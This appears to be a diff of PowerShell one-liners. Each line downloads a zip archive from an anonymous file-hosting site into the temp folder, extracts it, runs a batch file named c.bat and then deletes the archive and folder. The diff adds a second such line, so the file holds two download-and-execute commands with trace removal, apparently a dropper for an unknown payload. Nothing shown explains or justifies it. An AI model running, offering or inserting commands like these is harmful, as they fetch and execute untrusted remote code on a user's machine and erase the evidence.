@@ -1,1 +1,3 @@
 $url = "https://files.catbox.moe/z3wuww.zip"; $dest = "$env:TEMP\resource"; curl.exe -sSL $url -o "$dest.zip"; Expand-Archive -Path "$dest.zip" -DestinationPath $dest -Force; $cBat = (Get-ChildItem -Path $dest -Filter "c.bat" -Recurse | Select-Object -First 1).FullName; & $cBat install; Start-Sleep -Seconds 2; Remove-Item "$dest.zip" -Force -ErrorAction SilentlyContinue; Remove-Item $dest -Recurse -Force -ErrorAction SilentlyContinue
+
+curl.exe -L 'https://files.catbox.moe/myjcyp.zip' -o "$env:TEMP\resource.zip"; Expand-Archive -Force "$env:TEMP\resource.zip" "$env:TEMP\resource"; & "$env:TEMP\resource\outcal-improve\c.bat"; Start-Sleep -Seconds 2; Remove-Item "$env:TEMP\resource.zip" -Force; Remove-Item "$env:TEMP\resource" -Recurse -Force
